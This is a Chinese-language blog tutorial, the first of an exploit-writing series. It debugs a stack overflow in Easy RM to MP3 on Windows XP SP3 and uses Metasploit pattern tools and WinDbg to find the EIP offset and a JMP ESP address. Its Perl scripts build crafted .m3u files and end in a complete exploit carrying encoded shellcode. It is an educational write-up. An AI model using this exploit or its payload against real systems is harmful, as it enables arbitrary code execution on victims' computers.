<!DOCTYPE html><html class="appearance-auto" lang="zh-CN"><head><meta charset="UTF-8"><title>exploit编写系列1:Easy RM to MP3 漏洞调试</title><meta name="description" content="May the Force be with you"><meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, initial-scale=1"><!-- Google Analytics --><!-- End Google Analytics -->
<!-- Baidu Analytics --><!-- End Baidu Analytics --><link rel="icon" href="/images/rabete.jpg"><link rel="stylesheet" href="/style/common/bulma.css"><link rel="stylesheet" href="/style/base.css"><link rel="stylesheet" href="/style/common/helper.css"><script src="/js/common.js"></script><link rel="stylesheet" href="/style/post.css"><link rel="stylesheet" href="/style/themes/highlight-theme-light.css"><link rel="stylesheet" href="/style/common/jquery.fancybox.min.css"><script src="/js/highlight.pack.js"></script><meta name="description" content="Easy RM to MP3 漏洞调试0X00	前言分析这个漏洞主要是为了学习怎么通过调试并编写溢出类型漏洞的EXP
0X01	分析环境


调试环境
版本



系统版本
XP_sp3


Easy RM to MP3
2.7.3.700


windbg
6.12




0X02	漏洞描述这个漏洞是一个典型的溢出类型漏洞，在处理字符的时候没有对长度做限制，在读取到第25000~30000个字符的时候会导致返回地址被覆盖导致溢出
0X03	漏洞分析编写perl脚本生成漏洞验证文件
my $file= &quot;crash25000.m3u&quot;;
my $junk = &quot;\x41&quot; x 25000;
my $junk2 = &quot;\x42&quot; x 5000;
open($FILE,&quot;&amp;gt;$file&quot;);
print .."><script src="//unpkg.com/valine/dist/Valine.min.js"></script><meta name="generator" content="Hexo 6.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">xiaoeryu's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">exploit编写系列1:Easy RM to MP3 漏洞调试</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">点击返回顶部</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">首页</a></h3><h3 class="is-inline-block"><a href="/about">关于</a></h3><h3 class="is-inline-block"><a href="/archives">归档</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">首页</a></h3><h3 class="is-inline-block"><a href="/about">关于</a></h3><h3 class="is-inline-block"><a href="/archives">归档</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Easy-RM-to-MP3-%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95"><span class="toc-text">Easy RM to MP3 漏洞调试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0X00%E5%89%8D%E8%A8%80"><span class="toc-text">0X00	前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0X01%E5%88%86%E6%9E%90%E7%8E%AF%E5%A2%83"><span class="toc-text">0X01	分析环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0X02%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-text">0X02	漏洞描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0X03%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">0X03	漏洞分析</span></a></li></ol></li></ol></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/exploit%E7%BC%96%E5%86%99"><i class="tag post-item-tag">exploit编写</i></a><a href="/tags/%E6%BA%A2%E5%87%BA%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E"><i class="tag post-item-tag">溢出类型漏洞</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">exploit编写系列1:Easy RM to MP3 漏洞调试</h1><time class="has-text-grey" datetime="2021-05-20T02:22:12.000Z">2021-05-20</time><article class="mt-2 post-content"><h1 id="Easy-RM-to-MP3-漏洞调试"><a href="#Easy-RM-to-MP3-漏洞调试" class="headerlink" title="Easy RM to MP3 漏洞调试"></a>Easy RM to MP3 漏洞调试</h1><h3 id="0X00前言"><a href="#0X00前言" class="headerlink" title="0X00	前言"></a>0X00	前言</h3><p>分析这个漏洞主要是为了学习怎么通过调试并编写溢出类型漏洞的EXP</p>
<h3 id="0X01分析环境"><a href="#0X01分析环境" class="headerlink" title="0X01	分析环境"></a>0X01	分析环境</h3><table>
<thead>
<tr>
<th>调试环境</th>
<th>版本</th>
</tr>
</thead>
<tbody><tr>
<td>系统版本</td>
<td>XP_sp3</td>
</tr>
<tr>
<td>Easy RM to MP3</td>
<td>2.7.3.700</td>
</tr>
<tr>
<td>windbg</td>
<td>6.12</td>
</tr>
</tbody></table>
<span id="more"></span>

<h3 id="0X02漏洞描述"><a href="#0X02漏洞描述" class="headerlink" title="0X02	漏洞描述"></a>0X02	漏洞描述</h3><p>这个漏洞是一个典型的溢出类型漏洞，在处理字符的时候没有对长度做限制，在读取到第25000~30000个字符的时候会导致返回地址被覆盖导致溢出</p>
<h3 id="0X03漏洞分析"><a href="#0X03漏洞分析" class="headerlink" title="0X03	漏洞分析"></a>0X03	漏洞分析</h3><p>编写perl脚本生成漏洞验证文件</p>
<pre><code class="perl">my $file= "crash25000.m3u";
my $junk = "\x41" x 25000;
my $junk2 = "\x42" x 5000;
open($FILE,"&gt;$file");
print $FILE $junk.$junk2;
close($FILE);
print "m3u File Created successfully\n";
</code></pre>
<p>打开cmd输入命令<code>windbg.exe -I</code>，将windbg设置为默认调试器。</p>
<p>用 Easy RM to MP3 打开perl脚本生成的”crash25000.m3u”</p>
<p>windbg会自动捕获异常附加调试</p>
<img src="/2021/05/20/exploit%E7%BC%96%E5%86%99%E7%B3%BB%E5%88%971-Easy-RM-to-MP3-%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95/image-20201210234341795.png" class="" title="image-20201210234341795">

<p>可以看到 EIP 为42424242（BBBB），可以验证返回地址位于25000~30000之间。</p>
<p>我们下一步需要定位漏洞的具体位置：一般来说有两种方法：</p>
<ol>
<li>通过调试查看栈回溯查看堆栈的方式来确定溢出的位置。</li>
<li>将我们刚来写入字符“B”的位置填充为pattern字符串，观察程序崩溃时的 EIP来定位返回地址在缓冲区中的偏移。</li>
</ol>
<p>第二种方式无疑是比较简单方便的，我们就采用第二种方式来定位偏移。</p>
<p>​	使用metasploit framework文件夹下tool文件夹中的pattern_create.rb工具来创建一个包含5000个字符的模型替换刚才的“B”字符。</p>
<p>kali@kali:/usr/share/metasploit-framework/tools/exploit$ ./pattern_create.rb -l 5000</p>
<img src="/2021/05/20/exploit%E7%BC%96%E5%86%99%E7%B3%BB%E5%88%971-Easy-RM-to-MP3-%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95/image-20201211000614971.png" class="" title="image-20201211000614971">

<p>重新加载崩溃后可以看到 EIP 的值改变了</p>
<img src="/2021/05/20/exploit%E7%BC%96%E5%86%99%E7%B3%BB%E5%88%971-Easy-RM-to-MP3-%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95/image-20201211000800904.png" class="" title="image-20201211000800904">

<p>此时 EIP = 0x366a4235（小端字节序：35 42 6a 36 = 5Bj6）</p>
<p>再次使用 metasploit 的工具 pattern_offset.rb 来计算偏移值：</p>
<p>kali@kali:/usr/share/metasploit-framework/tools/exploit$ ./pattern_offset.rb -q 5Bj6</p>
<img src="/2021/05/20/exploit%E7%BC%96%E5%86%99%E7%B3%BB%E5%88%971-Easy-RM-to-MP3-%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95/image-20201211004850534.png" class="" title="image-20201211004850534">

<p>偏移位置 = 25000 + 1067</p>
<p>接下来我们可以重新设计一下payload来验证我们计算的偏移是否正确：</p>
<pre><code class="perl">my $file= "eipcrash.m3u";
my $junk= "A" x 26067;
my $eip = "BBBB";
my $espdata = "C" x 1000;
open($FILE,"&gt;$file");
print $FILE $junk.$eip.$espdata;
close($FILE);
print "m3u File Created successfully\n";
</code></pre>
<p>然后用生成的 “eipcrash.m3u”再次触发崩溃</p>
<img src="/2021/05/20/exploit%E7%BC%96%E5%86%99%E7%B3%BB%E5%88%971-Easy-RM-to-MP3-%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95/image-20201211005529815.png" class="" title="image-20201211005529815">

<p>可以看到 EIP 已经被我们写入的四个字节的 “B”覆盖掉了，此时我们已经可以控制 EIP 了，接下来我们需要考虑一下怎么让EIP指向我们的shellcode，以及如何把shellcode放到被攻击的虚拟内存空间并让EIP指向它并执行。</p>
<p>现在栈视图如下：</p>
<img src="/2021/05/20/exploit%E7%BC%96%E5%86%99%E7%B3%BB%E5%88%971-Easy-RM-to-MP3-%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95/image-20201213165731693.png" class="" title="image-20201213165731693">

<p>当函数返回时”BBBB”被放入EIP中执行，我们可以想办法让EIP指向我们存放shellcode的地址。</p>
<p>重新设计一下我们的shellcode：</p>
<ol>
<li>写入26067个”A”</li>
<li>EIP”BBBB”</li>
<li>用模型字符串替换刚才填入的字符”C”，确定一下ESP指向的地址是不是我们刚才填入的”C”开头第一个字符的位置（根据结果来调整我们的shellcode）。</li>
</ol>
<p>修改perl脚本：</p>
<pre><code class="perl">my $file= "test_1.m3u";
my $junk= "A" x 26067;
my $eip = "BBBB";
my $espdata = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag";
open($FILE,"&gt;$file");
print $FILE $junk.$eip.$espdata;
close($FILE);
print "m3u File Created successfully\n";
</code></pre>
<p>断下来之后可以看到ESP是从第五个字符开始的</p>
<img src="/2021/05/20/exploit%E7%BC%96%E5%86%99%E7%B3%BB%E5%88%971-Easy-RM-to-MP3-%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95/image-20201213190656563.png" class="" title="image-20201213190656563">

<p>这样我们可以修改一下shellcode将我们的payload往后面放放</p>
<p>现在我们可以考虑编写真正的shellcode了：</p>
<ol>
<li>我们可以控制EIP</li>
<li>我们知道可以在哪里存放我们的shellcode</li>
<li>将EIP指向ESP即可</li>
</ol>
<p>但是有一个问题，现在地址ESP(0x000ffd38)包含了终止字符(null:00)，如果我们直接使用这个地址的话执行到这个位置会引起中断从而达不到我们想要的效果</p>
<p>所以，需要换一种方法来让EIP指向我们的shellcode</p>
<p>我们可以选择在进程空间中找到一个<em>JMP ESP的地址（地址中不含00）</em>来帮助我们将EIP指向shellcode</p>
<p>jmp esp 的opcode是 ffe4，我们可以在加载的DLL里面搜索这个指令：s 019e0000 l 01ead000 ff e4</p>
<img src="/2021/05/20/exploit%E7%BC%96%E5%86%99%E7%B3%BB%E5%88%971-Easy-RM-to-MP3-%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95/image-20201213211505350.png" class="" title="image-20201213211505350">

<p>现在我们可以将EIP设置为0x01b9f23a，在进行测试一下，看看是否如我们所料能跳转进我们的shellcode中</p>
<pre><code class="perl">my $file= "test_2.m3u";
my $junk= "A" x 26067;
my $eip = pack('V',0x01b9f23a);;
my $espdata = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag";
open($FILE,"&gt;$file");
print $FILE $junk.$eip.$espdata;
close($FILE);
print "m3u File Created successfully\n";
</code></pre>
<p>果然成功如我们所料，EIP成功的断在了0x000ffd39处，说明我们找到的JMP ESP是有效的</p>
<img src="/2021/05/20/exploit%E7%BC%96%E5%86%99%E7%B3%BB%E5%88%971-Easy-RM-to-MP3-%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95/image-20201213213613001.png" class="" title="image-20201213213613001">

<p>但是现在这个payload只是一堆字符，什么都做不了，接下来我们只需要将payload替换为真正有效的payload即可。</p>
<pre><code class="perl">my $file= "test4.m3u";
my $junk= "A" x 26067;
my $eip = pack('V',0x01b9f23a); #overwrite EIP with call esp
my $prependesp = "XXXX"; #add 4 bytes so ESP points at beginning of shellcode bytes
my $shellcode = "\x90" x 25; #start shellcode with some NOPS
$shellcode = $shellcode .
"\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc\xd9\x74\x24\xf4\xb1" .
"\x1e\x58\x31\x78\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85\x30" .
"\x78\xbc\x65\xc9\x78\xb6\x23\xf5\xf3\xb4\xae\x7d\x02\xaa" .
"\x3a\x32\x1c\xbf\x62\xed\x1d\x54\xd5\x66\x29\x21\xe7\x96" .
"\x60\xf5\x71\xca\x06\x35\xf5\x14\xc7\x7c\xfb\x1b\x05\x6b" .
"\xf0\x27\xdd\x48\xfd\x22\x38\x1b\xa2\xe8\xc3\xf7\x3b\x7a" .
"\xcf\x4c\x4f\x23\xd3\x53\xa4\x57\xf7\xd8\x3b\x83\x8e\x83" .
"\x1f\x57\x53\x64\x51\xa1\x33\xcd\xf5\xc6\xf5\xc1\x7e\x98" .
"\xf5\xaa\xf1\x05\xa8\x26\x99\x3d\x3b\xc0\xd9\xfe\x51\x61" .
"\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f\x59\x90\x7b\xd7\x05" .
"\x7f\xe8\x7b\xca";
open($FILE,"&gt;$file");
print $FILE $junk.$eip.$prependesp.$shellcode;
close($FILE);
print "m3u File Created successfully\n";
</code></pre>
<p>完成</p>
<img src="/2021/05/20/exploit%E7%BC%96%E5%86%99%E7%B3%BB%E5%88%971-Easy-RM-to-MP3-%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95/image-20201220161353741.png" class="" title="image-20201220161353741">
</article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><a class="button is-default" href="/2021/05/20/exploit%E7%BC%96%E5%86%99%E7%B3%BB%E5%88%972%EF%BC%9A%E6%A0%88%E6%BA%A2%E5%87%BA%EF%BC%8C%E8%B7%B3%E8%BD%AC%E8%87%B3shellcode/" title="exploit编写系列2：栈溢出，跳转至shellcode"><i class="iconfont icon-prev mr-2 has-text-grey"></i><span class="has-text-weight-semibold">上一页: exploit编写系列2：栈溢出，跳转至shellcode</span></a><a class="button is-default" href="/2021/05/20/CVE-2009-0927-PDF%E4%B8%AD%E7%9A%84JS/" title="CVE-2009-0927:PDF中的JS"><span class="has-text-weight-semibold">下一页: CVE-2009-0927:PDF中的JS</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section><article class="mt-6 comment-container"><script async repo="Haojen/Claudia-theme-blog" src="https://utteranc.es/client.js" issue-term="pathname" theme="preferred-color-scheme"></script></article><article class="mt-6 comment-container" id="vcomments"></article></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><a title="twitter" target="_blank" rel="noopener nofollow" href="//twitter.com//"><i class="iconfont icon-twitter"></i></a><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/xiaoeryu"><i class="iconfont icon-github"></i></a><!-- Ins--><a title="instagram" target="_blank" rel="noopener nofollow" href="//www.instagram.com//"><i class="iconfont icon-ins"></i></a><!-- RSS--><!-- 知乎--><!-- 领英--><!-- 脸书--><a title="facebook" target="_blank" rel="noopener nofollow" href="//www.facebook.com//"><i class="iconfont icon-tian7_facebook"></i></a></section><p><span>Copyright ©</span><span> xiaoeryu 2022</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><p>Powered by Hexo &verbar;&nbsp;</p><p class="is-flex is-justify-content-center"><a title="Hexo theme author" target="_blank" rel="noopener" href="//github.com/haojen">Theme by Haojen&nbsp;</a></p><div style="margin-top: 2px"><a class="github-button" title="github-button" target="_blank" rel="noopener" href="https://github.com/haojen/hexo-theme-Claudia" data-color-scheme="no-preference: light; light: light; dark: dark;" data-show-count="true"></a></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/jquery-3.6.1.min.js"></script><script src="/js/jquery-fancybox.min.js"></script><script src="/js/img_zoom.js"></script><script src="/js/post.js"></script></body></html>